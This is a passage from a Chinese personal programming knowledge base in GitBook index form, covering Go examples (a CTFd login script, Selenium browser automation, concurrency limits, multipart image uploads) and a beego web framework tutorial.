:= http.NewRequest(\"GET\", \"https://cloud.ctfd.io/profile\", nil) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") resp, _ := Client.Do(req) if resp.StatusCode == 200 { dom, _ := goquery.NewDocumentFromReader(resp.Body) val, exists := dom.Find(\"#name-input\").Attr(\"value\") if exists { fmt.Printf(\"Success, Login as %s\\n\", val) } } } func main() { nonce := getNonce() fmt.Println(\"Nonce: \", nonce) res := login(nonce) if res { fmt.Println(\"登陆成功，尝试获取个人信息...\") getInfo() } } 效果： Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-31 17:53:52 "},"个人知识库/03.编程开发/GO/02.GO实例/04.使用GO+selenium.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/04.使用GO+selenium.html","title":"04.使用GO+selenium","keywords":"","body":" 前言 安装 基础使用 反爬 使用firefox 配置Chrome 前言 有的网站存在反爬机制，有的网站存在复杂的前端加密等等情况 这个时候就可以用selenium来模拟用户操作，简化我们的分析绕过时间 推荐：https://github.com/tebeka/selenium 安装 安装这个依赖包 go get -t -d github.com/tebeka/selenium 下载依赖 # 找到刚才下载的源码的路径 # 我的在 $GOPATH/pkg/mod/github.com/tebeka/selenium@v0.9.9/ cd vendor go run init.go --alsologtostderr --download_browsers --download_latest [!WARNING|style:flat] 下载依赖可能会遇到问题，没问题最好 手动安装：对应不同类型的浏览器进行安装 WebDriver，Google Chrome 需要安装 ChromeDriver，Firefox 则需要安装 geckodriver 安装的driver版本一定要和浏览器版本一致 基础使用 [!NOTE] 示例：https://github.com/tebeka/selenium/blob/master/example_test.go 文档：https://pkg.go.dev/github.com/tebeka/selenium#readme-documentation 实例：打开baidu.com然后搜索123123 数据那一块和python操作Selenium的方法都差不多 package main import ( \"fmt\" \"github.com/tebeka/selenium\" \"io/ioutil\" \"os\" ) const ( chromeDriverPath = \"/usr/local/bin/chromedriver\" port = 12345 ) func main() { // 创建driver服务实例 options := []selenium.ServiceOption{ //selenium.GeckoDriver(geckoDriverPath), // Specify the path to GeckoDriver in order to use Firefox. selenium.Output(os.Stderr), } selenium.SetDebug(true) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, options...) if err != nil { panic(err) } defer service.Stop() // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"chrome\", } wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(\"http://www.baidu.com/\") // 截屏 img, _ := wd.Screenshot() _ = ioutil.WriteFile(\"a.png\", img, 0666) element, _ := wd.FindElement(selenium.ByID, \"kw\") _ = element.Clear() // 方法一 _ = element.SendKeys(\"123123\") // 方法二 //_ = element.SendKeys(` // package main // import fmt // func main(){ // fmt.Println(\"hello\") // } // `) button, _ := wd.FindElement(selenium.ByID, \"su\") _ = button.Click() source, _ := wd.PageSource() fmt.Println(source) // 避免直接关闭chromnium页面，构造一个输入 var name string fmt.Scanln(&name) } 反爬 使用firefox https://gist.github.com/jacoduplessis/322d695d4cdab6ce866b939964588642 配置Chrome Chrome启动参数大全 /* 利用Selenium去获取网页的源码，有的有反爬机制，返回源码 */ func seleniumGetSource(url string) string { // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"Google Chrome\", } //禁止图片加载，加快渲染速度 imagCaps := map[string]interface{}{ \"profile.managed_default_content_settings.images\": 2, } // chrome设置 chromeCaps := chrome.Capabilities{ Prefs: imagCaps, Path: \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\", Args: []string{ //静默执行请求 //\"--headless\", // 设置Chrome无头模式，在linux下运行，需要设置这个参数，否则会报错 \"--no-sandbox\", \"--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.11\", // 模拟user-agent，防反爬, \"--disable-blink-features=AutomationControlled\", // 从 Chrome 88 开始，它的 V8 引擎升级了，加了这个参数，window.navigator.webdriver=false \"--proxy-server=socks5://127.0.0.1:1080\", }, ExcludeSwitches: []string{ \"enable-automation\", // 禁用左上角的控制显示 }, } caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(url) time.Sleep(time.Second*5) source, _ := wd.PageSource() //res, _ := wd.ExecuteScriptRaw(\"console.log(\\\"123123\\\" + window.navigator.webdriver)\", nil) //fmt.Println(string(res)) var x string _, _ = fmt.Scanln(&x) return source } Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-14 09:32:54 "},"个人知识库/03.编程开发/GO/02.GO实例/05.限制GO并发数.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/05.限制GO并发数.html","title":"05.限制GO并发数","keywords":"","body":" 前言 尝试chan 尝试sync 尝试chan+sync√ 信号量Semaphore 协程池 参考 前言 开发过程中，如果不限制并发数，如下代码这种，可能直接造成服务器宕机，而且很多结果不会输出 [!TIP|style:flat] 很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 func main() { userCount := math.MaxInt64 for i := 0; i 尝试chan package main import ( \"fmt\" \"math\" \"time\" ) func out(i int, semaphore chan bool){ fmt.Printf(\"go func: %d\\n\", i) // 释放通道 确实可以2个协程并发，但是和上面结果一样，很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 go func: 1 go func: 0 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 尝试sync 主要使用sync.WaitGroup{} package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) wg.Done() } func main() { userCount := math.MaxInt8 for i := 0; i 所有结果都显示出来了，也就是说所有子协程都执行完了，但是没有控制并发数量 尝试chan+sync√ 从上面2个可以看出，一个可以控制并发数量，另一个可以让所有子协程都执行完，所以结合一下，就能达到我们的目的了 package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int, semaphone chan bool){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) // 释放通道 结合一下，确实能达到我们想到的效果了！！！就是结果有点乱，一般来说不影响了 go func: 1 go func: 0 go func: 3 go func: 2 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 信号量Semaphore 和Python中的信号量一样，感觉是结合了chan+sync，确实是一个很好的方案，输出的结果也是按顺序输出的 https://github.com/EDDYCJY/gsema package main import ( \"fmt\" \"github.com/EDDYCJY/gsema\" \"math\" \"time\" ) var semaphore = gsema.NewSemaphore(2) func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) defer semaphore.Done() } func main() { userCount := math.MaxInt8 for i := 0; i go func: 0 go func: 1 go func: 2 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 协程池 这个就是一次性创建所有的协程，然后再根据大小来调用 https://github.com/panjf2000/ants https://github.com/Jeffail/tunny 参考 来，控制一下 Goroutine 的并发数量 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-19 11:43:22 "},"个人知识库/03.编程开发/GO/02.GO实例/06.使用GO上传图片.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/06.使用GO上传图片.html","title":"06.使用GO上传图片","keywords":"","body":" 前言 基础版 进阶版 完整版 前言 需要批量上传图片到图床，之前用python写脚本倒是很简单，不过GO因为并发太强大了，所以这次用GO来试试 基础版 构建一个上传图片的请求，主要代码在imgkr()函数中 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"os\" \"path/filepath\" ) var client http.Client func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 part, _ := bodyWriter.CreateFormFile(\"source\", filepath.Base(file.Name())) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 接收到的数据包 进阶版 上面的数据包大概是没什么问题，但是图片的Content-Type是application/octet-stream，而一般情况下图片的应该是形如image/png 分析了一下原因，是因为CreateFormFile函数里面硬编码了 看里面的一些函数，也没找到直接设置这个地方的Content-Type的，所以我决定根据他的规则重新写一下。 分析这个函数，前面h是header头，也是我们要修改的地方，后面是调用*Writer.CreatePart，我们也模拟这个行为就可以了 所以微调一下代码（直接给代码复制粘贴过来改就可以了，也可以直接重写CreateFormFile函数，后者稍微麻烦一点点） 效果 目标达成，完整代码 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"strings\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 完整版 写了一个上传到https://imgtu.com/的，大家有需可以参考 为了方便以后的复制粘贴，给构造上传图片请求单独写到imgkr()函数中的，不然应该给结果解析也写里面的 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"io/ioutil\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"regexp\" \"strings\" \"time\" \"github.com/json-iterator/go\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } /* 获取上传图片需要的token */ func getToken() string { u := \"https://imgtu.com/\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") resp, _ := client.Do(req) res,_ := ioutil.ReadAll(resp.Body) regex, _ := regexp.Compile(\"PF.obj.config.auth_token = \\\"(.*?)\\\";\") if regex.MatchString(string(res)){ token := regex.FindStringSubmatch(string(res))[1] return token } return \"\" } /* 构造上传请求 */ func imgkr(token string, imgFilePath string) *http.Request { // 上传网址 target := \"https://imgtu.com/json\" // 要上传的文件 file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"type\", \"file\") _ = bodyWriter.WriteField(\"action\", \"upload\") _ = bodyWriter.WriteField(\"timestamp\", fmt.Sprintf(\"%d\", time.Now().UnixNano()/1e6)) _ = bodyWriter.WriteField(\"auth_token\", token) _ = bodyWriter.WriteField(\"nsfw\", \"0\") // 自动补充boundary结尾 _ = bodyWriter.Close() //fmt.Println(bodyBuff) //构建的完整数据包，没有header // 创建请求 req, _ := http.NewRequest(\"POST\", target, bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") return req } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} token := getToken() req := imgkr(token, \"/Users/d4m1ts/d4m1ts/Upload/logo.png\") resp, _ := client.Do(req) res, _ := ioutil.ReadAll(resp.Body) imageUrl := jsoniter.Get(res, \"image\").Get(\"url\") fmt.Println(imageUrl.ToString()) } 效果 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-21 13:53:00 "},"个人知识库/03.编程开发/GO/03.beego框架/beego框架.html":{"url":"个人知识库/03.编程开发/GO/03.beego框架/beego框架.html","title":"beego框架","keywords":"","body":" 介绍 安装升级 安装 升级 bee工具使用 安装 基础使用 new api run pack bale version generate migrate dockerize 修改端口 快速入门 项目创建 启动过程 自定义路由 Controller逻辑 Model模型 View视图 字段操作 输出嵌套字段内容 条件输出 HTML实体化编码 模板变量 嵌套模板 静态文件 介绍 beego 是免费、开源的软件，这意味着任何人都可以为其开发和进步贡献力量。beego 源代码目前托管在 Github 上，Github 提供非常容易的途径 fork 项目和合并你的贡献。 Github地址：https://github.com/beego/beego [!NOTE] 建议看下README.md,还是有很大的帮助的 安装升级 安装 和常规的包安装一样，go get即可 go get -v github.com/beego/beego/v2@latest 或者手动下载源码go install，反正原理都是一样的 git clone https://github.com/beego/beego.git cd beego go install 升级 beego 升级分为 go 方式升级和源码下载升级： Go升级：通过该方式用户可以升级 beego 框架（推荐） go get -v -u github.com/beego/beego/v2@latest 源码下载升级：手动下载源码，然后覆盖到 $GOPATH/src/github.com/beego/beego 目录，然后通过本地执行安装就可以升级了： go install github.com/beego/beego bee工具使用 bee 工具是一个为了协助快速开发 beego 项目而创建的项目，通过 bee 您可以很容易的进行 beego 项目的创建、热编译、开发、测试、和部署。 安装 go get github.com/beego/bee/v2 下载完成后，会自动编译成可执行二进制文件bee，放到$GOPATH/bin目录下 基础使用 ▶ bee help Bee is a Fast and Flexible tool for managing your Beego Web Application. You are using bee for beego v2.x. If you are working on beego v1.x, please downgrade version to bee v1.12.0 USAGE bee command [arguments] AVAILABLE COMMANDS version Prints the current Bee version migrate Runs database migrations api Creates a Beego API application bale Transforms non-Go files to Go source files fix Fixes your application by making it compatible with newer versions of Beego pro Source code generator dev Commands which used to help to develop beego and bee dlv Start a debugging session using Delve dockerize Generates a Dockerfile for your Beego application generate Source code generator hprose Creates an RPC application based on Hprose and Beego frameworks new Creates a Beego application pack Compresses a Beego application into a single file rs Run customized scripts run Run the application by starting a local development server server serving static content over HTTP on port update Update Bee Use bee help [command] for more information about a command. ADDITIONAL HELP TOPICS Use bee help [topic] for more information about that topic. bee: Too many arguments. Use bee help for more information. new 新建一个web项目，用法： bee new 执行后会在当前目录创建文件夹，所以建议在src/目录下创建，创建后的目录结构： . ├── conf │ └── app.conf ├── controllers │ └── default.go ├── go.mod ├── main.go ├── models ├── routers │ └── router.go ├── static │ ├── css │ ├── img │ └── js │ └── reload.min.js ├── tests │ └── default_test.go └── views └── index.tpl 10 directories, 8 files api 上面的 new 命令是用来新建 Web 项目，不过很多用户使用 beego 来开发 API 应用。所以这个 api 命令就是用来创建 API 应用的 bee api ▶ bee api beegoAPI create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/go.mod create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/conf create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/controllers create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/tests create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/conf/app.conf create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/models create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/routers/ create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/controllers/object.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/controllers/user.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/tests/default_test.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/routers/router.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/models/object.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/models/user.go create /Users/d4m1ts/go/src/github.com/damit5/beegoAPI/main.go 目录结构如下： . ├── conf │ └── app.conf ├── controllers │ ├── object.go │ └── user.go ├── go.mod ├── main.go ├── models │ ├── object.go │ └── user.go ├── routers │ └── router.go └── tests └── default_test.go 从上面的目录我们可以看到和 Web 项目相比，少了 static 和 views 目录，多了一个 test 模块，用来做单元测试的 同时，该命令还支持一些自定义参数自动连接数据库创建相关 model 和 controller: bee api [appname] [-tables=\"\"] [-driver=mysql] [-conn=\"root:@tcp(127.0.0.1:3306)/test\"] 如果 conn 参数为空则创建一个示例项目，否则将基于链接信息链接数据库创建项目 run 我们在开发 Go 项目的时候最大的问题是经常需要自己手动去编译再运行，bee run 命令是监控 beego 的项目，通过fsnotify监控文件系统。但是注意该命令必须在 $GOPATH/src/ 下执行。 这样我们在开发过程中就可以实时的看到项目修改之后的效果 [!NOTE] 第一次运行bee run可能会存在很多小问题，根据提示依次解决即可 ▶ bee run 打开http://127.0.0.1:8080/即可看到Web页面 修改内容后会实时更新（类似于flask的debug模式） pack pack 命令用来发布应用的时候打包，会把项目打包成 zip 包，这样我们部署的时候直接把打包之后的项目上传，解压就可以部署了 ▶ bee pack bale 给所有的静态文件压缩为单个二进制文件 bee bale GO狂热者需要，平时感觉也没必要，略过 version 看各种版本等信息的 bee version ______ | ___ \\ | |_/ / ___ ___ | ___ \\ / _ \\ / _ \\ | |_/ /| __/| __/ \\____/ \\___| \\___| v2.0.2 ├── Beego : Beego is not installed. Please do consider installing it first: https://github.com/beego/beego/v2. If you are using go mod, and you don't install the beego under $GOPATH/src/github.com/astaxie, just ignore this. ├── GoVersion : go1.16.7 ├── GOOS : darwin ├── GOARCH : amd64 ├── NumCPU : 16 ├── GOPATH : /Users/d4m1ts/go ├── GOROOT : /usr/local/go ├── Compiler : gc └── Date : Friday, 7 Jan 2022 generate 自动生成代码，包含了从数据库一键生成 model，还包含了 scaffold 的 自己看帮助吧 migrate 这个命令是应用的数据库迁移命令，主要是用来每次应用升级，降级的SQL管理 dockerize 这个命令可以通过生成Dockerfile文件来实现docker化你的应用 感觉还可以，就是不知道实际效果咋样，后面可以再研究下 修改端口 beego启动后默认监听8080端口，修改的话，直接修改conf/app.conf即可 快速入门 项目创建 创建项目，还是利用bee去进行创建，主要分两个： bee new # MVC架构 bee api # RESTful风格后端 创建后都可以使用bee run进行热编译，然后访问对应的端口即可 后面暂时以MVC架构为主吧 启动过程 查看main.go，明显看到启动其实是 beego.Run() 我们看到的效果好像只是监听服务端口这个过程，但是它内部做了很多事情 1、解析配置文件 beego 会自动解析在 conf 目录下面的配置文件 app.conf，通过修改配置文件相关的属性，我们可以定义：开启的端口，是否开启 session，应用名称等信息。 2、执行用户的 hookfunc beego 会执行用户注册的 hookfunc，默认的已经存在了注册 mime，用户可以通过函数 AddAPPStartHook 注册自己的启动函数。 3、是否开启 session 会根据上面配置文件的分析之后判断是否开启 session，如果开启的话就初始化全局的 session。 4、是否编译模板 beego 会在启动的时候根据配置把 views 目录下的所有模板进行预编译，然后存在 map 里面，这样可以有效的提高模板运行的效率，无需进行多次编译。 5、是否开启文档功能 根据 EnableDocs 配置判断是否开启内置的文档路由功能 6、是否启动管理模块 beego 目前做了一个很酷的模块，应用内监控模块，会在 8088 端口做一个内部监听，我们可以通过这个端口查询到 QPS、CPU、内存、GC、goroutine、thread 等统计信息。 7、监听服务端口 这是最后一步也就是我们看到的访问 8080 看到的网页端口，内部其实调用了 ListenAndServe，充分利用了 goroutine 的优势 一旦 run 起来之后，我们的服务就监听在两个端口了，一个服务端口 8080 作为对外服务，另一个 8088 端口实行对内监控。 自定义路由 前面已经能访问了，说明肯定有一个基础的路由，GO解释器执行过程： 直接看看代码吧 package main import ( _ \"beegoStudy/routers\" beego \"github.com/beego/beego/v2/server/web\" ) func main() { beego.Run() } 第四行很明显，引入了我当前项目下的routers包，也就是路由，再去看一下这个目录下的文件router.go package routers import ( \"beegoStudy/controllers\" beego \"github.com/beego/beego/v2/server/web\" ) func init() { beego.Router(\"/\", &controllers.MainController{}) } 它会先引入controllers（逻辑处理），再执行init()函数，所以路由注册代码： beego.Router(\"/\", &controllers.MainController{}) // beego.Router(路由, 逻辑) 比如我们再创建一个路由： 编辑router.go文件，添加一行 package routers import ( \"beegoStudy/controllers\" beego \"github.com/beego/beego/v2/server/web\" ) func init() { beego.Router(\"/\", &controllers.MainController{}) beego.Router(\"/test\", &controllers.MainController{}) // 新加路由 } 查看效果 Controller逻辑 路由有了，那么接下来就应该是逻辑部分了 还是看示例代码吧，感觉有点基础通过看示例代码就基本上能入门了哈哈 注册路由的时候，第二个参数就是逻辑部分 看一下Router这个函数，逻辑部分应该是需要实现ControllerInterface这个接口 跟进ControllerInterface，可以看到他的方法列表 来看下默认生成的逻辑代码，很明显的实现了Get()方法 所以我们get调用的时候会返回渲染后的内容。 [!NOTE] 上面只是根据实例代码分析出来的，实际还是需要多找找资料文档研究 package controllers import ( beego \"github.com/beego/beego/v2/server/web\" ) type MainController struct { beego.Controller } func (c *MainController) Get() { c.Data[\"Website\"] = \"beego.me\" c.Data[\"Email\"] = \"d4m1ts@qq.com\" c.TplName = \"index.tpl\" } 上面的代码显示首先我们声明了一个控制器 MainController，这个控制器里面内嵌了 beego.Controller，这就是 Go 的嵌入方式，也就是 MainController 自动拥有了所有 beego.Controller 的方法。 而 beego.Controller 拥有很多方法，其中包括 Init、Prepare、Post、Get、Delete、Head 等方法。我们可以通过重写的方式来实现这些方法，而我们上面的代码就是重写了 Get 方法。 [!NOTE] beego 是一个 RESTful 的框架，所以我们的请求默认是执行对应 req.Method 的方法。例如浏览器的是 GET 请求，那么默认就会执行 MainController 下的 Get 方法。这样我们上面的 Get 方法就会被执行到，这样就进入了我们的逻辑处理。 c.Data是一个用来存储输出数据的 map，可以赋值任意类型的值，会在最后一步把里面的内容渲染到tpl模板对应的位置，用户设置了模板之后系统会自动的调用 Render 函数（这个函数是在 beego.Controller 中实现的），所以无需用户自己来调用渲染。 最后一步是渲染的模板，c.TplName 就是需要渲染的模板，这里指定了 index.tpl，如果用户不设置该参数，那么默认会去到模板目录的 Controller/.tpl 查找，例如上面的方法会去 maincontroller/get.tpl (文件、文件夹必须小写)。 不使用模版，可以直接用 c.Ctx.WriteString 调用上下文来输出字符串 c.Ctx.WriteString(\"test\") Model模型 我们知道 Web 应用中我们用的最多的就是数据库操作，而 model 层一般用来做这些操作，我们的 bee new 例子不存在 Model 的演示，但是 bee api 应用中存在 model 的应用。说的简单一点，如果您的应用足够简单，那么 Controller 可以处理一切的逻辑，如果您的逻辑里面存在着可以复用的东西，那么就抽取出来变成一个模块。因此 Model 就是逐步抽象的过程，一般我们会在 Model 里面处理一些数据读取 View视图 在前面编写 Controller 的时候，我们在 Get() 方法里面写过这样的语句 c.TplName = \"index.tpl\"，设置显示的模板文件，默认支持 tpl 和 html 的后缀名，如果想设置其他后缀你可以调用 beego.AddTemplateExt 接口设置 很多动态语言里面都是通过在静态 HTML 中插入动态语言生成的数据，例如 JSP 中通过插入 ，PHP 中通过插入 来实现的，beego 采用了 Go 语言默认的模板引擎，所以和 Go 的模板语法一样 Go Web 编程 字段操作 Go 语言的模板通过 {{}} 来包含需要在渲染时被替换的字段，{{.}} 表示当前的对象，这和 Java 或者 C++ 中的 this 类似，如果要访问当前对象的字段通过 {{.FieldName}}，但是需要注意一点：这个字段必须是导出的 (字段首字母必须是大写的)，否则在渲染的时候就会报错 c.Data[\"Website\"] = \"beego.me\" c.Data[\"Email\"] = \"d4m1ts@qq.com\" 输出嵌套字段内容 如果字段里面还有对象，可以使用 {{with …}}…{{end}} 和 {{range …}}{{end}} 来进行数据的循环输出 `function(start, stop, step) { if(typeof stop === 'undefined') { stop = start; start = 0; step = 1; } else if(!step) { step = 1; } var arr = []; var i; if (step > 0) { for (i=start; istop; i+=step) { arr.push(i); } } return arr; }` 这个和 Go 语法里面的 range 类似，循环操作数据 `` 操作是指当前对象的值，类似上下文的概念 Emails := []string { \"d4m1ts@qq.com\", \"tset@qq.com\", } c.Data[\"Emails\"] = Emails {{range .Emails}} {{.}} {{end}} {{with .Emails}} {{range .}} {{.}} {{end}} {{end}} 条件输出 在 Go 模板里面如果需要进行条件判断，那么我们可以使用和 Go 语言的 if-else 语法类似的方式来处理，如果 pipeline 为空，那么 if 就认为是 false 1、{{if bool}} ... {{end}} 2、{{if bool}} ... {{else}} ... {{end}} [!WARNING] 注意：if 里面无法使用条件判断，例如 .Mail==\"astaxie@gmail.com\"，这样的判断是不正确的，if 里面只能是 bool 值 c.Data[\"Res1\"] = true c.Data[\"Res2\"] = false {{if .Res1}} True {{end}} {{if .Res2}} True {{else}} False {{end}} HTML实体化编码 [!NOTE] pipelines，和Unix下的管道符 | 一样，给前面的结果传递给后面 Go 语言模板最强大的一点就是支持 pipe 数据，在 Go 语言里面任何 {{}} 里面的都是 pipelines 数据，例如我们上面输出的 email 里面如果还有一些可能引起 XSS 注入的，就可以使用如下语法来防止，把输出全部转化 html 的实体 {{. | html}} 举例： {{.Email | html}} 模板变量 有时候，我们在模板使用过程中需要定义一些局部变量，我们可以在一些操作中申明局部变量 {{with $x := \"output\" | printf \"%q\"}}{{$x}}{{end}} {{with $x := \"output\"}}{{printf \"%q\" $x}}{{end}} {{with $x := \"output\"}}{{$x | printf \"%q\"}}{{end}} 嵌套模板 我们平常开发 Web 应用的时候，经常会遇到一些模板有些部分是固定不变的，然后可以抽取出来作为一个独立的部分，例如一个博客的头部和尾部是不变的，而唯一改变的是中间的内容部分。所以我们可以定义成 header、content、footer 三个部分。Go 语言中通过如下的语法来声明 {{define \"子模板名称\"}}内容{{end}} 通过如下方式来调用 {{template \"子模板名称\"}} 举例： //header.tpl {{define \"header\"}} 演示信息 {{end}} //content.tpl {{define \"content\"}} {{template \"header\"}} 演示嵌套 嵌套使用define定义子模板 调用使用template {{template \"footer\"}} {{end}} //footer.tpl {{define \"footer\"}} {{end}} 静态文件 前面我们介绍了如何输出静态页面，但是我们的网页往往包含了很多的静态文件，包括图片、JS、CSS 等，刚才创建的应用里面就创建了如下目录 ├── static │ ├── css │ ├── img │ └── js │ └── reload.min.js beego 默认注册了 static 目录为静态处理的目录，注册样式：URL 前缀和映射的目录（在/main.go文件中beego.Run()之前加入） StaticDir[\"/static\"] = \"static\" 所以默认情况下可以这样访问 用户可以设置多个静态文件处理目录，例如你有多个文件下载目录 download1、download2，你可以这样映射（在 /main.go 文件中 beego.Run() 之前加入） beego.SetStaticPath(\"/down1\", \"download1\") beego.SetStaticPath(\"/down2\", \"download2\") Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 20:39:30 "},"个人知识库/04.暂未分类/01.代理类/01.Linux下搭建ShadowSocks服务器.html":{"url":"个人知识库/04.暂未分类/01.代理类/01.Linux下搭建ShadowSocks服务器.html","title":"01.Linux下搭建ShadowSocks服务器","keywords":"","body":" 安装SS服务端 CentOS Debian/Ubuntu 配置ShadowSocks 启动Shadowsocks服务端 客户端连接服务端 配置 成功截图 其他 疑难杂症 同类产品 安装SS服务端 